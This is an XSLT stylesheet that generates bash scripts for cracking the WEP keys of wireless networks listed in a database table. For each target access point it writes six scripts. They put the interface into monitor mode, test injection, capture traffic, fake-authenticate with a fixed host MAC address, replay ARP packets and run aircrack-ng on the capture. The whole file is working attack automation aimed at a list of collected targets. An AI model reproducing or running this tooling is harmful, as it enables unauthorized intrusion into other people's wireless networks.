<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    version="1.0">
 <xsl:output method="text" />
 <xsl:param name="if">wlan0</xsl:param>
 <xsl:param name="mon">mon0</xsl:param>
 <xsl:param name="mac">00:23:4d:4e:e2:7d</xsl:param>
 <xsl:param name="nl">\n<xsl:text>
 </xsl:text></xsl:param>
 <xsl:template match="/">#!/bin/bash
# make script made with help from
# http://www.aircrack-ng.org/doku.php?id=simple_wep_crack

host_mac=<xsl:value-of select="$mac"/>
root=$(pwd)
  <xsl:apply-templates select="/schema/rows/table[@name='marks']/row" />
 </xsl:template>
 
 <xsl:template match="/schema/rows/table[@name='marks']/row">
  cd ${root}
  mkdir "<xsl:value-of select="field[@name='ap']"/>" 2>/dev/null
  cd "<xsl:value-of select="field[@name='ap']"/>"
  # step 1
echo -e $(cat &lt;&lt;+
 <xsl:call-template name="step1">
  <xsl:with-param name="channel"  select="field[@name='channel']"/>
 </xsl:call-template>  
+
) > step1.sh
  #step 2
echo -e $(cat &lt;&lt;+
 <xsl:call-template name="step2">
  <xsl:with-param name="mac"  select="field[@name='mac_address']"/>
  <xsl:with-param name="essid"  select="field[@name='ap']"/>
 </xsl:call-template>  
+
) > step2.sh
  # step 3
echo -e $(cat &lt;&lt;+
 <xsl:call-template name="step3">
  <xsl:with-param name="channel"  select="field[@name='channel']"/>
  <xsl:with-param name="mac"  select="field[@name='mac_address']"/>
 </xsl:call-template>  
+
) > step3.sh
  # step 4
echo -e $(cat &lt;&lt;+
 <xsl:call-template name="step4">
  <xsl:with-param name="mac"  select="field[@name='mac_address']"/>
  <xsl:with-param name="ap"  select="field[@name='ap']"/>
 </xsl:call-template>  
+
) > step4.sh
  # step 5
echo -e $(cat &lt;&lt;+
 <xsl:call-template name="step5">
  <xsl:with-param name="mac"  select="field[@name='mac_address']"/>
 </xsl:call-template>  
+
) > step5.sh
  # step 6
echo -e $(cat &lt;&lt;+
 <xsl:call-template name="step6">
  <xsl:with-param name="mac"  select="field[@name='mac_address']"/>
 </xsl:call-template>  
+
) > step6.sh
chmod +x *.sh
 </xsl:template>
 <xsl:template name="step1" ><xsl:param name="channel" />
  #!/bin/bash<xsl:value-of select="$nl"/>
  airmon-ng stop <xsl:value-of select="$mon"/> <xsl:value-of select="$nl"/>
  airmon-ng start <xsl:value-of select="$if"/><xsl:text> </xsl:text> <xsl:value-of select="$channel"/><xsl:value-of select="$nl"/>
 </xsl:template>
    
 <xsl:template name='step2' ><xsl:param name="essid" /><xsl:param name="mac" />#!/bin/bash<xsl:value-of select="$nl"/>
 aireplay-ng -9 -e <xsl:value-of select="$essid"/> -a <xsl:value-of select="$mac"/><xsl:text> </xsl:text><xsl:value-of select="$mon"/>
 </xsl:template>
 <xsl:template name="step3" ><xsl:param name="mac" /><xsl:param name="channel" />#!/bin/bash <xsl:value-of select="$nl"/>
 airodump-ng -c <xsl:value-of select="$channel"/> --bssid <xsl:value-of select="$mac"/> -w output <xsl:value-of select="$mon"/>
 </xsl:template>
 <xsl:template name="step4"  ><xsl:param name="mac" /><xsl:param name="ap" />#!/bin/bash<xsl:value-of select="$nl"/>
 aireplay-ng -1 0 -e <xsl:value-of select="$ap"/> -a <xsl:value-of select="$mac"/> -h ${host_mac} <xsl:value-of select="$mon"/>
 </xsl:template>
 <xsl:template name="step5" ><xsl:param name="mac" />#!/bin/bash<xsl:value-of select="$nl"/>
 aireplay-ng -3 -b <xsl:value-of select="$mac"/> -h  ${host_mac} <xsl:value-of select="$mon"/>  
 </xsl:template>
 <xsl:template name="step6"><xsl:param name="mac" />#!/bin/bash<xsl:value-of select="$nl"/>
 aircrack-ng -b <xsl:value-of select="$mac"/> output*.cap
 </xsl:template>  
</xsl:stylesheet>